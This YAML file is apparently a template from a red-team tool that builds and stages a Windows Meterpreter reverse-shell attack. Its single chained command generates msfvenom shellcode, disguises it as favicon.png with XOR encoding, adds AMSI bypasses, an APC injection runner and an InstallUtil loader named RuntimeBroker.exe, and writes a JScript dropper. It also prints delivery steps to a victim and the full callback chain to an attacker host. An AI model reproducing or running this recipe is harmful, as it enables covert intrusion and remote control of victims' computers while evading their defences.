---
metadata:
  filename: "deliver-windows-x64-metasploit-meterpreter-tcp-shellcode-runner-jscript-installutils-apc.yaml"
  tags: ["shell", "windows", "evasion"]
  created: "2026-06-04"
  authors: ["@s3mme", "@TIVKU"]

content: |
  mkdir -p packstation/outbound; \
  command -v mcs > /dev/null 2>&1 || printf '%s\n' 'ERROR: mcs (Mono C# compiler) not found' ; \
  find /opt -name "System.Management.Automation.dll" 2>/dev/null | grep -q . || printf '%s\n' 'ERROR: System.Management.Automation.dll not found or accessible in /opt (PowerShell SDK required)' ; \
  command -v mcs > /dev/null 2>&1 && \
  find /opt -name "System.Management.Automation.dll" 2>/dev/null | grep -q . && \
  printf '%s\n' 'msfvenom creates the shellcode. Please wait...' && \
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ attacker_ip }} LPORT={{ shell_port }} EXITFUNC=thread -f raw > packstation/outbound/shellcode.bin && \
  python {{ templates_dir }}/helper_scripts/shellcode_encrypter.py -m xor -i packstation/outbound/shellcode.bin -o packstation/outbound/favicon.png && \
  rm packstation/outbound/shellcode.bin && \
  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset.yaml > packstation/outbound/offer1.txt && \
  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset-2.yaml > packstation/outbound/offer2.txt && \
  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-forceerror.yaml > packstation/outbound/offer3.txt && \
  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-mattgref02.yaml > packstation/outbound/offer4.txt && \
  python {{ templates_dir }}/helper_scripts/shellcode_runner_generator.py -t apc -d staged --url http://{{ attacker_ip }}:{{ delivery_outbound_port }}/favicon.png --xor CA --timing --obfuscate -o packstation/outbound/invoice.txt && \
  python -c "import base64; open('/tmp/RuntimeBroker.cs','w').write(base64.b64decode('{{ include('payloads/installutil-ps-loader-cs.yaml') | base64 }}').decode())" && \
  printf '%s\n' 'Compiling RuntimeBroker.exe. Please wait...' && \
  find /opt -name "System.Management.Automation.dll" 2>/dev/null | head -1 | xargs -I{} mcs /tmp/RuntimeBroker.cs -r:{} -r:System.Configuration.Install -target:exe -sdk:4 -out:packstation/outbound/RuntimeBroker.exe 2>/dev/null && \
  rm /tmp/RuntimeBroker.cs && \
  python -c "import base64; open('packstation/outbound/delivery.js','w').write(base64.b64decode('{{ include('payloads/installutil-jscript-smb.yaml') | base64 }}').decode())" && \
  printf '%s\n' '================================================================' && \
  printf '%s\n' '                      ------Listener------                      ' && \
  printf '%s\n' 'Start listener: {{ include('scripts/listener-metasploit-windows-x64-meterpreter-staged-tcp.yaml') }}' && \
  printf '%s\n' '================================================================' && \
  printf '%s\n' '                  ---Step-by-Step Delivery---                  ' && \
  printf '%s\n' 'Step 1 - Ensure the target system has installutil.exe installed' && \
  printf '%s\n' '  Required: .NET Framework 4.0 at C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ ' && \
  printf '%s\n' 'Step 2 - Pick an AMSI bypass and copy it to offer.txt:' && \
  printf '%s\n' '  offer1.txt (FieldOffset):   cp packstation/outbound/offer1.txt packstation/outbound/offer.txt' && \
  printf '%s\n' '  offer2.txt (FieldOffset 2): cp packstation/outbound/offer2.txt packstation/outbound/offer.txt' && \
  printf '%s\n' '  offer3.txt (ForceError):    cp packstation/outbound/offer3.txt packstation/outbound/offer.txt' && \
  printf '%s\n' '  offer4.txt (MattGref02):    cp packstation/outbound/offer4.txt packstation/outbound/offer.txt' && \
  printf '%s\n' 'Step 3 - Start the meterpreter listener (see above)' && \
  printf '%s\n' 'Step 4 - Start impacket SMB server in a separate terminal:' && \
  printf '%s\n' '  impacket-smbserver share packstation/outbound -smb2support' && \
  printf '%s\n' 'Step 5 - Deliver delivery.js to the target (e.g., email, USB, webdav)' && \
  printf '%s\n' 'Step 6 - Attack chain on victim double-click:' && \
  printf '%s\n' '  delivery.js -> WScript.Shell -> net use \\\\{{ attacker_ip }}\\share (mount SMB)' && \
  printf '%s\n' '  -> InstallUtil.exe /U \\\\{{ attacker_ip }}\\share\\RuntimeBroker.exe' && \
  printf '%s\n' '  -> Loader.Uninstall() triggers PS runspace' && \
  printf '%s\n' '  -> PS runspace 1: IEX offer.txt (chosen AMSI bypass)' && \
  printf '%s\n' '  -> PS runspace 2: IEX invoice.txt (APC shellcode runner)' && \
  printf '%s\n' '  -> invoice.txt downloads XOR(0xCA) shellcode from http://{{ attacker_ip }}:{{ delivery_outbound_port }}/favicon.png' && \
  printf '%s\n' '  -> injects into notepad.exe via Early Bird APC' && \
  printf '%s\n' '  -> meterpreter callback on {{ attacker_ip }}:{{ shell_port }}' && \
  printf '%s\n' '================================================================' && \
  printf '%s\n' '                  ---Files in packstation---                   ' && \
  printf '%s\n' '  RuntimeBroker.exe         -> installutil CLM bypass (served via SMB)' && \
  printf '%s\n' '  offer1-4.txt              -> AMSI bypass variants (pick one, cp to offer.txt)' && \
  printf '%s\n' '  offer.txt                 -> chosen AMSI bypass (IEX by C# runspace)' && \
  printf '%s\n' '  invoice.txt               -> APC shellcode runner (IEX by C# runspace)' && \
  printf '%s\n' '  favicon.png               -> XOR(0xCA) meterpreter shellcode (fetched by runner)' && \
  printf '%s\n' '  delivery.js               -> JScript dropper, deliver to target' && \
  printf '%s\n' '================================================================' && \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
